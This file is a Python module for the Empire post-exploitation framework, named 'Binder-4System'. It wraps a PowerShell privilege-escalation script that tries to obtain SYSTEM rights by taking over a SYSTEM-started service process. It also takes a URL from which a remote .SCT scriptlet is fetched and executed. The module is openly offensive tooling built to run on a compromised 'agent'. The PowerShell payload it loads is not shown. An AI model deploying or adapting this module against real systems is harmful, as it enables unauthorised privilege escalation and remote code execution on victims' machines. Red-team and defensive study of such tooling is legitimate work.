from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            'Name': 'Binder-4System',
            'Author': ['Luis Vacas @ CyberVaca'],
            'Description': ("This payload tries to get the system user. "
                            "For this we must pass the process of a service started by system."),
            'Background' : True,
            'OutputExtension' : None,
            'NeedsAdmin' : False,
            'OpsecSafe' : False,
            'MinPSVersion' : '2',
            'Comments': [
                'This payload uses files in the disk drive.',
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
	    },
        	'ProcID' : {
                'Description'   :   'Process Id of a service started by system.',
                'Required'      :   True,
                'Value'         :   ''
            }, 
            	'Url' : {
                'Description'   :   'Execute .SCT command from URL ',
                'Required'      :   True,
                'Value'         :   ''
	    } 
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self):
        
        # the PowerShell script itself, with the command to invoke
        #   for execution appended to the end. Scripts should output
        #   everything to the pipeline for proper parsing.
        #
        # the script should be stripped of comments, with a link to any
        #   original reference script included in the comments.

	script = ""

        # if you're reading in a large, external script that might be updates,
        #   use the pattern below
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "data/module_source/privesc/Binder-4System.ps1"
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode
	script += "binder-4system "

        # add any arguments to the end execution of the script
        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + '"' + str(values['Value']) + '"'

        return script
